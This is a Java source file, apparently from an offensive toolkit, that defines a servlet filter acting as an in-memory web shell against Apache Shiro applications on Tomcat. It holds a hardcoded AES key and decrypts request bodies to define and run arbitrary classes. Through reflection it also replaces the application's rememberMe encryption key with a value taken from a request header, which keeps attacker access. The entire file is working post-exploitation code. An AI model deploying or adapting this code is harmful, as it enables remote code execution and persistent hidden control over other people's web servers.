package com.summersec.x;

import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * 在 {@link ChangeShiroKeyFilter2} 基础上，对多个常见 {@link ServletContext#getFilterRegistration} 名称依次尝试。
 */
public class ChangeShiroKeyFilter4 extends ClassLoader implements Filter {

    public String shirokey = "FcoRsBKe9XB3zOHbxTG0Lw==";
    HttpServletRequest request = null;
    HttpServletResponse response = null;
    public String cs = "UTF-8";

    private static final String[] FILTER_REGISTRATION_NAMES = {
            "shiroFilterFactoryBean",
            "shiroFilter",
            "ShiroFilterFactoryBean",
            "springShiroFilter"
    };

    public ChangeShiroKeyFilter4() {
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public ChangeShiroKeyFilter4(ClassLoader c) {
        super(c);
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpSession session = ((HttpServletRequest) servletRequest).getSession();
        Object lastRequest = servletRequest;
        Object lastResponse = servletResponse;
        if (!(lastRequest instanceof RequestFacade)) {
            try {
                Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                lastRequest = getRequest.invoke(servletRequest);
                while (true) {
                    if (lastRequest instanceof RequestFacade) {
                        break;
                    }
                    lastRequest = getRequest.invoke(lastRequest);
                }
            } catch (Exception e) {
            }
        }
        try {
            if (!(lastResponse instanceof ResponseFacade)) {
                Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                lastResponse = getResponse.invoke(servletResponse);
                while (true) {
                    if (lastResponse instanceof ResponseFacade) {
                        break;
                    }
                    lastResponse = getResponse.invoke(lastResponse);
                }
            }
        } catch (Exception e) {
        }

        Map obj = new HashMap();
        obj.put("request", lastRequest);
        obj.put("response", lastResponse);
        obj.put("session", session);

        try {
            session.putValue("u", this.shirokey);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(java.util.Base64.getDecoder().decode(this.shirokey), "AES"));
            (new ChangeShiroKeyFilter4(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(servletRequest.getReader().readLine()))).newInstance().equals(obj);
        } catch (Exception var7) {
            var7.printStackTrace();
        }
    }

    private void applyKeyFromRegistration(Object reg) throws Exception {
        Field field = reg.getClass().getDeclaredField("filterDef");
        field.setAccessible(true);
        Object obj = field.get(reg);
        field = obj.getClass().getDeclaredField("filter");
        field.setAccessible(true);
        obj = field.get(obj);
        field = obj.getClass().getSuperclass().getDeclaredField("securityManager");
        field.setAccessible(true);
        obj = field.get(obj);
        field = obj.getClass().getSuperclass().getDeclaredField("rememberMeManager");
        field.setAccessible(true);
        obj = field.get(obj);
        Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", new Class[]{byte[].class});
        byte[] bytes = this.base64Decode(this.shirokey);
        setEncryptionCipherKey.invoke(obj, new Object[]{bytes});
        Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", new Class[]{byte[].class});
        setDecryptionCipherKey.invoke(obj, new Object[]{bytes});
    }

    public String ChangeKey() {
        try {
            ServletContext context = request.getServletContext();
            String lastErr = null;
            for (String name : FILTER_REGISTRATION_NAMES) {
                try {
                    Object reg = context.getFilterRegistration(name);
                    if (reg == null) {
                        continue;
                    }
                    applyKeyFromRegistration(reg);
                    return "change key ok";
                } catch (Exception e) {
                    lastErr = e.getMessage();
                }
            }
            return lastErr != null ? lastErr : "no filter registration matched";
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.shirokey = this.request.getHeader("p");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.ChangeKey());
        } catch (Exception var7) {
            output.append(var7.getMessage());
        }

        try {
            this.response.getWriter().println(tag_s + output + tag_e);
            this.response.getWriter().println("change shiro key is " + this.shirokey);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[]) ((Object[]) obj);
            this.request = (HttpServletRequest) data[0];
            this.response = (HttpServletResponse) data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest) obj;
                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest) req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse) resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse) this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }

    @Override
    public void destroy() {
    }
}
